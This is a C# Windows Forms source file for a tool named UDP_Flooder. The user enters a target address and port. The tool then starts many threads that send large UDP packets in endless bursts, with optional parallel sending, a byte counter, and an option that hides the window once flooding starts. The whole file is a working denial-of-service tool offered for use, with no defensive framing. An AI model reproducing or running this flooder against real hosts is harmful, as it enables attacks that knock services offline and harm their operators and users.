using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Threading;
using System.Diagnostics;

namespace UDP_Flooder
{
    public partial class Form1 : Form
    {
        public static int size;
        public static double sizeCount = 0;

        public int sizegen()
        {
            if (checkBox1.Checked)
            {
                return new Random().Next(1, 65000); //Random bytes from 1 to 255 because random does not work in a closed loop
            }
            else
            {
                return size;
            }
        }

        public static bool isEnabled = false;

        public void sock(string address, int port)
        {
            UdpClient client = new UdpClient(address, port);
            while (isEnabled) //Double isEnabled so that we can stop the function immediately when the stop button is clicked
            {
                byte[] rubbish = new byte[sizegen()]; //Creates table of bytes which contain individual bytes eg. [0x20, 0x20...]
                if (!enableMulticoreToolStripMenuItem.Checked)
                {
                    for (int i = 1; i < numericUpDown3.Value && isEnabled; i++) //for each socket we send however many actions that were set
                    {
                        client.Send(rubbish, rubbish.Length); //Each byte in the variable is 1 byte large, so the length is equal to the size of the data sent.
                        if (enableByteCounterToolStripMenuItem.Checked)
                        {
                            label8.Visible = true;
                            sizeCount += rubbish.Length;
                            label8.Text = string.Concat("Bytes sent: ", sizeCount);
                        }
                    }
                }
                else
                {
                    Parallel.For(1, Convert.ToInt32(numericUpDown3.Value), i => //Just copy-pasted the previous function but changed to Parallel.For
                    {
                        if (isEnabled)
                        {
                            client.Send(rubbish, rubbish.Length);
                            if (enableByteCounterToolStripMenuItem.Checked)
                            {
                                label8.Visible = true;
                                sizeCount += rubbish.Length;
                                label8.Text = string.Concat("Bytes sent: ", sizeCount);
                            }
                        }
                    });

                }
                Thread.Sleep(Convert.ToInt32(numericUpDown2.Value)); //delay in between bursts (if you left the delay on at least)
            }
        }

        public void init()
        {
            for (int i = 1; i < numericUpDown1.Value && isEnabled; i++)
            {
                new Thread(() => sock(textBox1.Text, Convert.ToInt32(textBox2.Text))).Start(); //Creates new thread that runs the flooder itself
            }
        }

        public Form1() //On second thought, I should have actually bothered to label the control variables for it to be easier to mod
        {
            InitializeComponent();
            this.MaximizeBox = false;
            trackBar1.TickStyle = TickStyle.None; //It looked annoying enough
        }

        private void button1_Click(object sender, EventArgs e)
        {
            button1.Text = isEnabled ? "Start" : "Stop";
            isEnabled = !isEnabled;
            if (isEnabled)
            {
                if (disappearWhenStartedToolStripMenuItem.Checked)
                {
                    this.WindowState = FormWindowState.Minimized;
                    this.ShowInTaskbar = false;
                }
                size = trackBar1.Value; //Safe (sex/) variables for safe threads
                init(); //Starts the flooding
            }
        }

        private void trackBar1_Scroll(object sender, EventArgs e)
        {
            label4.Text = trackBar1.Value != 1 ? "Bytes" : "Byte"; //Ever seen "1 bytes"?
            textBox3.Text = trackBar1.Value.ToString();
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            trackBar1.Enabled = textBox3.Enabled = !checkBox1.Checked;
        }

        private void Form1_Resize(object sender, EventArgs e)
        {
            if (WindowState == FormWindowState.Minimized && minimiseToTaskbarToolStripMenuItem.Checked == true)
            {
                notifyIcon1.Visible = true;
                Hide();
            }
            else
            {
                notifyIcon1.Visible = false;
            }
        }

        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            this.Visible = true;
            notifyIcon1.Visible = false;
        }

        private void contextMenuStrip1_Opened(object sender, EventArgs e)
        {
            Application.Exit(); //Exit on right click of icon in the tray
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (enableByteCounterToolStripMenuItem.Checked) //For the display of the byte counter
            {
                label8.Visible = true;
                label8.Text = "Bytes sent: 0";
                sizeCount = 0;
                button2.Visible = true;
            }
            else
            {
                label8.Visible = false;
                button2.Visible = false;
            }
        }

        private void textBox3_TextChanged(object sender, EventArgs e) //Warning this function looks extremely stupid
        {
            textBox3.Text = textBox3.Text.Replace(" ", string.Empty);
            try
            {
                double boxVal = Convert.ToDouble(textBox3.Text); //In case user types some really large number for some reason
                if (boxVal < 1)
                {
                    trackBar1.Value = 1;
                    textBox3.Text = "1";
                }
                else if (boxVal > 65000)
                {
                    trackBar1.Value = 65000;
                    textBox3.Text = "65000";
                }
                else
                {
                    trackBar1.Value = Convert.ToInt32(textBox3.Text);
                }
                label4.Text = Convert.ToInt32(textBox3.Text) != 1 ? "Bytes" : "Byte";
            }
            catch
            {
                if (textBox3.Text != "") //I warned you
                {
                    trackBar1.Value = 1; //I don't actually remember what I'm trying to achieve here so I'll leave it like that
                    textBox3.Text = "1";
                    label4.Text = "Byte";
                }
            }
        }
    }
}
